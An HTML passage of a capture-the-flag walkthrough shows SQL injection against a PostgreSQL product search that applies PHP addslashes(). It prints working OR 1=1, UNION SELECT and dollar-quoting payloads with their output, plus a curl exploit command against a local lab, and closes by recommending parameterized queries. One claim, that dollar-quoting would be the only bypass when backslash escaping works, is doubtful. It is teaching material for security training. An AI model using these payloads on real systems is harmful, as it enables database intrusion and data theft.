<h4>Step 1: Test Normal Search</h4>
<p>
    Search for a product to see normal behavior. The application uses <code>ILIKE</code>
    for case-insensitive matching.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>Mouse<br>
        <span class="prompt">SQL&gt; </span>SELECT id, name, price FROM products WHERE name ILIKE '%Mouse%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Name:</strong> Wireless Mouse &bull; <strong>Price:</strong> $29.99
    </div>
</div>

<h4>Step 2: Observe the addslashes() Filter</h4>
<p>
    The application applies <code>addslashes()</code> to your input, which escapes single quotes
    (<code>'</code>) by prepending a backslash (<code>\'</code>). Try a basic injection:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Test Quote Escaping</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' OR 1=1 --<br>
        <span class="prompt">SQL&gt; </span>SELECT id, name, price FROM products WHERE name ILIKE '%\' OR 1=1 --%'<br>
        <span class="prompt">Filter: </span>addslashes() applied to input<br><br>
        <span class="prompt">Output: </span><strong>All 5 products returned!</strong><br>
        <strong>ID:</strong> 1 &bull; <strong>Name:</strong> Wireless Mouse &bull; <strong>Price:</strong> $29.99<br>
        <strong>ID:</strong> 2 &bull; <strong>Name:</strong> Mechanical Keyboard &bull; <strong>Price:</strong> $89.99<br>
        <strong>ID:</strong> 3 &bull; <strong>Name:</strong> USB-C Hub &bull; <strong>Price:</strong> $45.50<br>
        <strong>ID:</strong> 4 &bull; <strong>Name:</strong> Monitor Stand &bull; <strong>Price:</strong> $34.00<br>
        <strong>ID:</strong> 5 &bull; <strong>Name:</strong> Webcam HD &bull; <strong>Price:</strong> $59.95
    </div>
</div>

<p>
    <strong>Wait: it worked?!</strong> Despite addslashes() turning <code>'</code> into <code>\'</code>,
    all products are returned. This reveals a critical flaw.
</p>

<h4>Step 3: Understand Why addslashes() Fails on PostgreSQL</h4>
<p>
    Modern PostgreSQL (9.1+) sets <code>standard_conforming_strings = on</code> by default.
    This means backslashes in string literals are treated as <strong>literal characters</strong>,
    not escape sequences. When <code>addslashes()</code> turns <code>'</code> into <code>\'</code>:
</p>
<ul>
    <li><code>'%x\'</code>: PostgreSQL sees <code>\</code> as a literal backslash, and <code>'</code> terminates the string</li>
    <li>The ILIKE pattern becomes <code>%x\</code> (with a trailing backslash)</li>
    <li>Everything after the closing quote is executed as SQL</li>
</ul>

<h4>Step 4: Extract the Flag with UNION</h4>
<p>
    Since addslashes() is ineffective, inject a UNION to extract the <code>secret_code</code>
    from the products table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Extract</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>x' UNION SELECT 1,secret_code,price FROM products --<br>
        <span class="prompt">SQL&gt; </span>SELECT id, name, price FROM products WHERE name ILIKE '%x\' UNION SELECT 1,secret_code,price FROM products --%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> PROD-KB-001 &bull; <strong>Price:</strong> $89.99<br>
        <strong>Name:</strong> PROD-WC-004 &bull; <strong>Price:</strong> $59.95<br>
        <strong>Name:</strong> FLAG{d0ll4r_qu0t3_byp4ss} &bull; <strong>Price:</strong> $29.99<br>
        <strong>Name:</strong> PROD-HUB-002 &bull; <strong>Price:</strong> $45.50<br>
        <strong>Name:</strong> PROD-MS-003 &bull; <strong>Price:</strong> $34.00
    </div>
</div>

<p>The flag <code>FLAG{d0ll4r_qu0t3_byp4ss}</code> appears in the Name column.</p>

<h4>Step 5: Dollar-Quoting. PostgreSQL's Unique String Syntax</h4>
<p>
    PostgreSQL supports <strong>dollar-quoting</strong> (<code>$$text$$</code>) as an alternative
    to single-quoted strings. This is useful when you need to embed string values in your
    injection but single quotes are escaped. <code>addslashes()</code> does not escape dollar signs.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Dollar-Quoting Strings</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Use $$ instead of quotes when filtering:</span><br>
        <span class="prompt">Input: </span>x' UNION SELECT 1,secret_code,price FROM products WHERE name=$$Wireless Mouse$$ --<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> FLAG{d0ll4r_qu0t3_byp4ss} &bull; <strong>Price:</strong> $29.99
    </div>
</div>

<p>
    Dollar-quoting lets you use string values without single quotes. This is especially
    valuable in scenarios where <code>standard_conforming_strings = off</code> and the
    backslash escape actually works: dollar-quoting would be the only bypass.
</p>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{d0ll4r_qu0t3_byp4ss}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab2" \<br> --data-urlencode "search=x' UNION SELECT 1,secret_code,price FROM products --"<br><br>
        <span class="prompt">Output (flag appears in Name column):</span><br>
        <strong>Name:</strong> PROD-KB-001 &bull; <strong>Price:</strong> $89.99<br>
        <strong>Name:</strong> PROD-WC-004 &bull; <strong>Price:</strong> $59.95<br>
        <strong>Name:</strong> FLAG{d0ll4r_qu0t3_byp4ss} &bull; <strong>Price:</strong> $29.99<br>
        <strong>Name:</strong> PROD-HUB-002 &bull; <strong>Price:</strong> $45.50<br>
        <strong>Name:</strong> PROD-MS-003 &bull; <strong>Price:</strong> $34.00
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> With <code>standard_conforming_strings = on</code> (default since
    PostgreSQL 9.1), <code>addslashes()</code> is completely ineffective because backslashes are
    literal characters: the injected quote still closes the string. Additionally, PostgreSQL's
    dollar-quoting (<code>$$text$$</code>) provides another bypass since dollar signs are not
    escaped by <code>addslashes()</code>. The correct defense is parameterized queries:
    <code>pg_query_params($conn, 'SELECT ... WHERE name ILIKE $1', array("%$input%"))</code>.
</div>
